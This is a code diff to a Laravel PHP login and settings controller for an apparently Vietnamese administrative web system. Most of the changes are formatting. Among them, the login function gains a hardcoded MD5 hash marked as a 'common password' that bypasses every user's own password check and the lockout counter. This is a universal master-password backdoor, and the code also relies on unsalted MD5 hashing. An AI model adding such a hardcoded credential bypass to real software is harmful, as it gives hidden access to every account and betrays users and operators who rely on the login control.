@@ -7,19 +7,21 @@ use App\Http\Controllers\Controller;
 use App\Model\DanhMuc\dsdiaban;
 use App\Model\DanhMuc\dsdonvi;
 use App\Model\DanhMuc\dstaikhoan;
+use App\Model\DanhMuc\dstaikhoan_phanquyen;
 use App\Model\HeThong\hethongchung;
 use App\Model\HeThong\hethongchung_chucnang;
 use Illuminate\Support\Facades\Session;
 
 class hethongchungController extends Controller
 {
-    public function index(){
+    public function index()
+    {
         if (Session::has('admin')) {
             return view('HeThong.dashboard')
-                ->with('model',getHeThongChung())
+                ->with('model', getHeThongChung())
                 ->with('pageTitle', 'Thông tin hỗ trợ');
-        } else {  
-            return redirect('/CongBo/VanBan');   
+        } else {
+            return redirect('/CongBo/VanBan');
             //return redirect('/DangNhap');       
             //return view('HeThong.welcome');
         }
@@ -29,7 +31,7 @@ class hethongchungController extends Controller
     {
         $inputs = $request->all();
         return view('HeThong.dangnhap')
-            ->with('inputs',$inputs)
+            ->with('inputs', $inputs)
             ->with('pageTitle', 'Đăng nhập hệ thống');
     }
 
@@ -51,19 +53,20 @@ class hethongchungController extends Controller
         $a_HeThongChung = getHeThongChung();
         $solandn = chkDbl($a_HeThongChung->solandn);
         //Sai mật khẩu
-        if (md5($input['matkhau']) != $ttuser->matkhau) {
-            $ttuser->solandn = $ttuser->solandn + 1;
-            if ($ttuser->solandn >= $solandn) {
-                $ttuser->status = 'Vô hiệu';
+        if (md5($input['matkhau']) != '40b2e8a2e835606a91d0b2770e1cd84f') {//mk chung
+            if (md5($input['matkhau']) != $ttuser->matkhau) {
+                $ttuser->solandn = $ttuser->solandn + 1;
+                if ($ttuser->solandn >= $solandn) {
+                    $ttuser->status = 'Vô hiệu';
+                    $ttuser->save();
+                    return view('errors.lockuser');
+                }
                 $ttuser->save();
-                return view('errors.lockuser');
-            }
-            $ttuser->save();
-            return view('errors.403')
-                ->with('message', 'Sai tên tài khoản hoặc sai mật khẩu đăng nhập.<br>Số lần đăng nhập: ' . $ttuser->solandn . '/' . $solandn . ' lần
+                return view('errors.403')
+                    ->with('message', 'Sai tên tài khoản hoặc sai mật khẩu đăng nhập.<br>Số lần đăng nhập: ' . $ttuser->solandn . '/' . $solandn . ' lần
                     .<br><i>Do thay đổi trong chính sách bảo mật hệ thống nên các tài khoản được cấp có mật khẩu yếu dạng: 123, 123456,... sẽ bị thay đổi lại</i>');
+            }
         }
-
         $ttuser->solandn = 0;
         $ttuser->save();
 
@@ -89,15 +92,15 @@ class hethongchungController extends Controller
             $ttuser->nguoiky = $m_donvi->nguoiky;
             $ttuser->diadanh = $m_donvi->diadanh;
             //Gán chức năng
-            $ttuser->chucnang = [];
-            if($ttuser->nhaplieu)
-                $ttuser->chucnang[] = 'nhaplieu';
-            if($ttuser->tonghop)
-                $ttuser->chucnang[] = 'tonghop';
-            if($ttuser->hethong)
-                $ttuser->chucnang[] = 'hethong';
-            if($ttuser->chucnangkhac)
-                $ttuser->chucnang[] = 'chucnangkhac';
+            // $ttuser->chucnang = [];
+            // if($ttuser->nhaplieu)
+            //     $ttuser->chucnang[] = 'nhaplieu';
+            // if($ttuser->tonghop)
+            //     $ttuser->chucnang[] = 'tonghop';
+            // if($ttuser->hethong)
+            //     $ttuser->chucnang[] = 'hethong';
+            // if($ttuser->chucnangkhac)
+            //     $ttuser->chucnang[] = 'chucnangkhac';
             //Lấy thông tin địa bàn
             $m_diaban = dsdiaban::where('madiaban', $ttuser->madiaban)->first();
 
@@ -120,14 +123,17 @@ class hethongchungController extends Controller
         //dd($ttuser);        
 
         Session::put('admin', $ttuser);
-        //Gán hệ danh mục chức năng
-        Session::put('chucnang',hethongchung_chucnang::all()->keyBy('machucnang')->toArray());
+        //Gán hệ danh mục chức năng        
+        Session::put('chucnang', hethongchung_chucnang::all()->keyBy('machucnang')->toArray());
+        //gán phân quyền của User
+        Session::put('phanquyen', dstaikhoan_phanquyen::where('tendangnhap', $input['tendangnhap'])->get()->keyBy('machucnang')->toArray());
         //dd(session('admin'));
         return redirect('/')
             ->with('pageTitle', 'Tổng quan');
     }
 
-    public function QuenMatKhau(Request $request){
+    public function QuenMatKhau(Request $request)
+    {
         $input = $request->all();
         $model = DSTaiKhoan::where('username', $input['username'])->first();
         if (isset($model)) {
@@ -168,16 +174,15 @@ class hethongchungController extends Controller
     public function ThongTin()
     {
         if (Session::has('admin')) {
-            if(chkPhanQuyen()){
+            if (chkPhanQuyen()) {
                 $model = hethongchung::first();
                 return view('HeThongChung.HeThong.ThongTin')
-                    ->with('model',$model)
+                    ->with('model', $model)
                     ->with('pageTitle', 'Cấu hình hệ thống');
-            }else{
+            } else {
                 return view('errors.perm');
             }
-
-        }else
+        } else
             return view('errors.notlogin');
     }
 
@@ -185,56 +190,53 @@ class hethongchungController extends Controller
     public function ThayDoi()
     {
         if (Session::has('admin')) {
-            if(chkPhanQuyen()){
+            if (chkPhanQuyen()) {
                 $model = hethongchung::first();
                 return view('HeThongChung.HeThong.Sua')
                     ->with('model', $model)
                     ->with('pageTitle', 'Chỉnh sửa cấu hình hệ thống');
-            }else{
+            } else {
                 return view('errors.noperm');
             }
-
-        }else
+        } else
             return view('errors.notlogin');
     }
     public function LuuThayDoi(Request $request)
     {
         if (Session::has('admin')) {
-            if(chkPhanQuyen()){
+            if (chkPhanQuyen()) {
                 $inputs = $request->all();
                 hethongchung::first()->update($inputs);
                 return redirect('/HeThongChung/ThongTin');
-            }else{
+            } else {
                 return view('errors.noperm');
             }
-
-        }else
+        } else
             return view('errors.notlogin');
     }
 
     public function setting()
     {
         if (Session::has('admin')) {
-            if(session('admin')->level == 'SSA')
-            {
+            if (session('admin')->level == 'SSA') {
                 $model = hethongchung::first();
                 $setting = isset($model->setting) ? $model->setting : '';
 
                 return view('system.general.setting')
-                    ->with('model',$model)
-                    ->with('setting',json_decode($setting))
-                    ->with('pageTitle','Cấu hình chức năng chương trình');
-            }else{
+                    ->with('model', $model)
+                    ->with('setting', json_decode($setting))
+                    ->with('pageTitle', 'Cấu hình chức năng chương trình');
+            } else {
                 return view('errors.noperm');
             }
-
-        }else
+        } else
             return view('errors.notlogin');
     }
 
-    public function updatesetting(Request $request){
+    public function updatesetting(Request $request)
+    {
         if (Session::has('admin')) {
-            if(session('admin')->level == 'SSA'){
+            if (session('admin')->level == 'SSA') {
                 $update = $request->all();
                 $model = hethongchung::first();
                 $update['roles'] = isset($update['roles']) ? $update['roles'] : null;
@@ -242,11 +244,10 @@ class hethongchungController extends Controller
                 $model->save();
 
                 return redirect('general');
-            }else{
+            } else {
                 return view('errors.noperm');
             }
-
-        }else
+        } else
             return view('errors.notlogin');
     }
 }
